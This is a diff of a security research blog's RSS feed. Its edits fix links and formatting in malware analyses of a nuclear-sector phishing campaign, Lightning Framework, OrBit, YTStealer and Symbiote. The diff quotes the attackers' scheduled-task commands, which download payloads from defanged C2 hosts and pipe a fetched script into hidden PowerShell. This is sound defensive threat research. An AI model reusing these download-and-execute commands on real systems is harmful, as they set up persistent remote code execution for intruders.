+&lt;td&gt;Less likely to defeat automated analysis techniques&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -7775,7 +7792,7 @@ actor the name of the infected machine. These tactics have been observed being
 used by Bitter APT in
 &lt;a href="https://blog.talosintelligence.com/bitter-apt-adds-bangladesh-to-their/"target="_blank" rel="noopener"&gt;2021/2022&lt;/a&gt;.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:WindowsSystem32schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%\dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -7788,13 +7805,13 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="images/fig4" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig4.png" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 4: Scheduled task&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The second scheduled task created attempts to execute the payload downloaded by
 the other task:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%\dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -7839,7 +7856,7 @@ data-copied-label="Copied!"
 &lt;p&gt;We did not fetch any additional payloads from the C2, but we were served empty
 MSI files, allowing us to discover the names of the next stage payloads.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="images/fig5" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig5.png" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 5: Empty payloads served from different C2 servers&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;This may allow the actor to examine the server logs of beaconing infected
@@ -7861,7 +7878,7 @@ concatenation.&lt;/p&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The decoded command is the following:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%\pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%\pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%\pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -7958,67 +7975,67 @@ data-copied-label="Copied!"
 &lt;tr&gt;
 &lt;td&gt;Reconnaissance&lt;/td&gt;
 &lt;td&gt;Email Addresses&lt;/td&gt;
-&lt;td&gt;T1589.002&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1589/002"target="_blank" rel="noopener"&gt;T1589.002&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;The actor gathers target email addresses to target with spearphishing emails&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Initial Access&lt;/td&gt;
 &lt;td&gt;Spearphishing Attachment&lt;/td&gt;
-&lt;td&gt;T1566.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1566/001"target="_blank" rel="noopener"&gt;T1566.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Spearphishing is used to deliver RAR attachments&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Execution&lt;/td&gt;
 &lt;td&gt;PowerShell&lt;/td&gt;
-&lt;td&gt;T1059.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1059/001"target="_blank" rel="noopener"&gt;T1059.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Encoded PowerShell is used by CHM payload&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Execution&lt;/td&gt;
 &lt;td&gt;Exploitation for Client Execution&lt;/td&gt;
-&lt;td&gt;T1203&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1203"target="_blank" rel="noopener"&gt;T1203&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Microsoft Office exploits are used to execute code&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Persistence&lt;/td&gt;
 &lt;td&gt;Scheduled Task&lt;/td&gt;
-&lt;td&gt;T1053.005&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1053/005"target="_blank" rel="noopener"&gt;T1053.005&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Scheduled Tasks used for both execution and persistence&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Msiexec&lt;/td&gt;
-&lt;td&gt;T1218.007&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1218/007"target="_blank" rel="noopener"&gt;T1218.007&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Msiexec is used to launch next stage payloads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Compiled HTML File&lt;/td&gt;
-&lt;td&gt;T1218.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1218/001"target="_blank" rel="noopener"&gt;T1218.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;CHM files are used to deliver payloads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Masquerading&lt;/td&gt;
-&lt;td&gt;T1036&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1036"target="_blank" rel="noopener"&gt;T1036&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Files are masqueraded as legitimate files and scheduled tasks are named after common tasks (eg. Adobe Updater)&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Discovery&lt;/td&gt;
 &lt;td&gt;System Information Discovery&lt;/td&gt;
-&lt;td&gt;T1082&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1082"target="_blank" rel="noopener"&gt;T1082&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;First stage payloads fetch Computer and User names&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Command and Control&lt;/td&gt;
 &lt;td&gt;Web Protocols&lt;/td&gt;
-&lt;td&gt;T1071.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1071/001"target="_blank" rel="noopener"&gt;T1071.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;HTTPS is used for C2 communication&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Command and Control&lt;/td&gt;
 &lt;td&gt;Exfiltration Over C2 Channel&lt;/td&gt;
-&lt;td&gt;T1041&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1041"target="_blank" rel="noopener"&gt;T1041&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Data can be exfiltrated&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
@@ -8241,6 +8258,10 @@ malware being used in attacks in the wild.&lt;/p&gt;
 &lt;a href="#technical-analysis-of-lightning-framework" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The framework consists of a downloader and core module, with a number of
 plugins. Some of the plugins used by the malware are open-source tools. Below
 is a figure of the framework layout:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig1.jpeg" title="Diagram of the Lightning Framework layout: the downloader and core module with their plugins." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Diagram of the Lightning Framework layout: the downloader and core module with their plugins.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
 &lt;h3&gt;Overview of the Modules&lt;span class="hx:absolute hx:-mt-20" id="overview-of-the-modules"&gt;&lt;/span&gt;
 &lt;a href="#overview-of-the-modules" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
@@ -8302,7 +8323,7 @@ is a figure of the framework layout:&lt;/p&gt;
 &lt;a href="#lightningdownloader" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The main function of the downloader module is to fetch the other components and
 execute the core module.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig1.png" title="Lightning Downloader result in Intezer Analyze" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig2.png" title="Lightning Downloader result in Intezer Analyze" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Lightning Downloader result in Intezer Analyze&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The downloader module starts by checking if it is located in the working
@@ -8314,7 +8335,7 @@ itself to that working directory and execute that copy. The downloader will
 fingerprint the host name and network adapters to generate a GUID, which will
 be sent to the command and control (C2) server.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig2.png" title="Building the GUID" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig3.png" title="Building the GUID" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Building the GUID&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The downloader will then contact the C2 to fetch the following modules and
@@ -8328,14 +8349,14 @@ plugins:&lt;/p&gt;
 &lt;li&gt;&lt;code&gt;Lightning.Core&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig3.png" title="Resources fetched from the C2" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig4.png" title="Resources fetched from the C2" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Resources fetched from the C2&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The method of contacting the C2 will be described below in the malleable C2
 section (click here to jump to that section). The downloader will then execute
 the core module (&lt;code&gt;kkdmflush&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig4.png" title="Execution of the core module" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig5.png" title="Execution of the core module" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Execution of the core module&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;h3&gt;Lightning.Core&lt;span class="hx:absolute hx:-mt-20" id="lightningcore"&gt;&lt;/span&gt;
@@ -8347,7 +8368,7 @@ under the radar.&lt;/p&gt;
 &lt;p&gt;The core module modifies the name of the calling thread of the module to
 &lt;code&gt;kdmflush&lt;/code&gt;, to make it appear that it is a kernel thread.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig5.png" title="Using prctl to modify calling thread name" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig6.png" title="Using prctl to modify calling thread name" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Using prctl to modify calling thread name&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;Next the core module sets up persistence by creating a script that is executed
@@ -8373,7 +8394,7 @@ data-copied-label="Copied!"
 &lt;p&gt;This script will execute the downloader module upon boot. The service is then
 added using the &lt;code&gt;chkconfig&lt;/code&gt; utility.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig6.png" title="Creation of the init.d script and service" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig7.png" title="Creation of the init.d script and service" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Creation of the init.d script and service&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The timestamp of the file is modified to hide artifacts, a technique known as
@@ -8382,7 +8403,7 @@ its last modified time edited to match that of either &lt;code&gt;whoami&lt;/cod
 &lt;code&gt;su&lt;/code&gt;. It will look for each file respectively until it finds one. This
 technique is used for most of the files that the framework creates.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig7.png" title="File timestamp modification function" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig8.png" title="File timestamp modification function" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;File timestamp modification function&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The malware will attempt to hide its Process ID (PID) and any related network
@@ -8393,7 +8414,7 @@ installed. The PIDs are written to &lt;code&gt;proc/y.y&lt;/code&gt; for use by 
 scrub any reference to files running in the framework from commands such as
 &lt;code&gt;ps&lt;/code&gt; and &lt;code&gt;netstat&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig8.png" title="Writing PID to proc/y.y if it exists (Indication that rootkit exists)" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig9.png" title="Writing PID to proc/y.y if it exists (Indication that rootkit exists)" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Writing PID to proc/y.y if it exists (Indication that rootkit exists)&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The core module will generate a GUID in the same manner as the downloader and
@@ -8520,18 +8541,18 @@ encoded configuration file that is unique for every single creation. This means
 that configuration files will not be able to be detected through techniques
 such as hashes. The key is built into the start of the encoded file.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig9.png" title="Encoded malleable C2 configuration profile" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig10.png" title="Encoded malleable C2 configuration profile" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Encoded malleable C2 configuration profile&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig10.png" title="The dynamic XOR decoding routine" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig11.png" title="The dynamic XOR decoding routine" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;The dynamic XOR decoding routine&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The decoded configuration is structured in JSON. The default configuration in
 the analyzed sample uses a local IP address &lt;code&gt;10.2.22[.]67&lt;/code&gt; with the port
 &lt;code&gt;33229&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig11.png" title="Decoded default configuration" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig12.png" title="Decoded default configuration" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Decoded default configuration&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;There is a passive mode of communication available if the actor executes the
@@ -8540,7 +8561,7 @@ the &lt;code&gt;Linux.Plugin.Lightning.Sshd&lt;/code&gt; plugin. The plugin is a
 has hardcoded private and host keys, allowing the attacker to SSH into the
 machine with their own SSH key, creating a secondary backdoor.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig12.png" title="Hardcoded keys inside the modified OpenSSH daemon" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/lightning-framework-new-linux-threat/images/fig13.png" title="Hardcoded keys inside the modified OpenSSH daemon" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Hardcoded keys inside the modified OpenSSH daemon&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;h2&gt;Summary&lt;span class="hx:absolute hx:-mt-20" id="summary"&gt;&lt;/span&gt;
@@ -8999,7 +9020,10 @@ command and gets the result from the output file. Next it omits records that
 contain the symlink one of the following: the malicious library
 (&lt;code&gt;MALWARE_FOLDER/.l&lt;/code&gt;), the GID which is used by the malware (&lt;code&gt;920366&lt;/code&gt;) and its
 folder path.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/07/orbit-new-undetected-linux-threat/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2022/07/orbit-new-undetected-linux-threat/images/fig5.png" title="OrBit malware folder path" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;OrBit malware folder path&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
 &lt;h4&gt;Achieving Persistence&lt;span class="hx:absolute hx:-mt-20" id="achieving-persistence"&gt;&lt;/span&gt;
 &lt;a href="#achieving-persistence" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The malware uses two methods to achieve persistence. The reason the malware
 uses both of the methods is to make it hard removing the malware from an
@@ -9143,8 +9167,8 @@ project&amp;rsquo;s readme file. The framework is marketing itself for Red Teams
 pen-testers. It provides anti-debugging, anti-memory analysis, and anti-VM
 functionality.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig1.png" title="Figure 1: Part of Chacals README." alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 1: Part of Chacals README.&lt;/figcaption&gt;
+&lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig1.png" title="Figure 1: Part of Chacal&amp;#39;s README." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 1: Part of Chacal&amp;#39;s README.&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;What sets YTStealer aside from other stealers sold on the Dark Web market is
 that it is solely focused on harvesting credentials for one single service
@@ -9162,8 +9186,8 @@ called &lt;a href="https://go-rod.github.io"target="_blank" rel="noopener"&gt;Ro
 control browsers over the DevTools Protocol and markets itself as a tool for
 web automation and scraping.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig2.png" title="Figure 2: Screenshot of Rods documentation describing the framework." alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 2: Screenshot of Rods documentation describing the framework.&lt;/figcaption&gt;
+&lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig2.png" title="Figure 2: Screenshot of Rod&amp;#39;s documentation describing the framework." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 2: Screenshot of Rod&amp;#39;s documentation describing the framework.&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;Using the web browser, YTStealer navigates to YouTube&amp;rsquo;s Studio page which
 allows content creators to manage their content. From YouTube studio, the
@@ -9220,8 +9244,8 @@ profile picture for a user on the site. Figure 4 shows the profile page of the
 user. The profile page provided a link to a Twitter account. Figure 5 shows a
 screenshot of the Twitter account.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig4.png" title="Figure 4: Screenshot of Aparat user accounts profile page that uses YOUBOT SOLUTIONS LLCs logo as their profile image." alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 4: Screenshot of Aparat user accounts profile page that uses YOUBOT SOLUTIONS LLCs logo as their profile image.&lt;/figcaption&gt;
+&lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig4.png" title="Figure 4: Screenshot of Aparat user account&amp;#39;s profile page that uses YOUBOT SOLUTIONS LLC&amp;#39;s logo as their profile image." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Figure 4: Screenshot of Aparat user account&amp;#39;s profile page that uses YOUBOT SOLUTIONS LLC&amp;#39;s logo as their profile image.&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2022/06/ytstealer-malware-youtube-cookies/images/fig5.png" title="Figure 5: Twitter profile linked to in the Aparat user profile." alt="" loading="lazy" /&gt;
@@ -9294,10 +9318,10 @@ be applied. Only use software from trusted sources.&lt;/p&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Symbiote: Analysis of a New, Nearly-Impossible-to-Detect Linux Threat</title><link>https://research.intezer.com/blog/2022/06/new-linux-threat-symbiote/</link><pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2022/06/new-linux-threat-symbiote/</guid><description>
+&lt;/div&gt;</description></item><item><title>Symbiote Deep-Dive: Analysis of a New, Nearly-Impossible-to-Detect Linux Threat</title><link>https://research.intezer.com/blog/2022/06/new-linux-threat-symbiote/</link><pubDate>Thu, 09 Jun 2022 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2022/06/new-linux-threat-symbiote/</guid><description>
 &lt;p&gt;&lt;em&gt;This research is a joint effort between Joakim Kennedy, Security Researcher at
 Intezer, and the BlackBerry Threat Research &amp;amp; Intelligence team. It can be
-found in the BlackBerry blog here as well.&lt;/em&gt;&lt;/p&gt;
+found in the BlackBerry blog &lt;a href="https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat"target="_blank" rel="noopener"&gt;here&lt;/a&gt; as well.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;In biology, a symbiote is an organism that lives in symbiosis with another
 organism. The symbiosis can be mutually beneficial to both organisms, but
 sometimes it can be parasitic when one benefits and the other is harmed. A few
@@ -9468,7 +9492,7 @@ option suggests that this malware was written by a skilled developer.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;; Load Ether frame type from the packet.
 0x00: 0x28 0x00 0x00 0x000c ldabsh 0xc
-; Jump if it’s not IPv6 (0x86DD)
+; Jump if it&amp;#39;s not IPv6 (0x86DD)
 0x01: 0x15 0x00 0x0b 0x86dd jeq r0, 0x86dd, &amp;#43;0, &amp;#43;0x0b (jump to 0xd)
 ; Load IPv6 next header into register.
 0x02: 0x30 0x00 0x00 0x0014 ldabsb 0x14
@@ -9888,6 +9912,7 @@ also much harder to change the behavior of the threat and stay undetected.&lt;/p
 &lt;img src="https://research.intezer.com/blog/2022/05/threat-hunting-sigma-detection-rules/images/fig1.png" title="Pyramid of Pain by David J Bianco" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Pyramid of Pain by David J Bianco&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Source: &lt;a href="https://www.sans.org/tools/the-pyramid-of-pain/"target="_blank" rel="noopener"&gt;The Pyramid of Pain, SANS&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
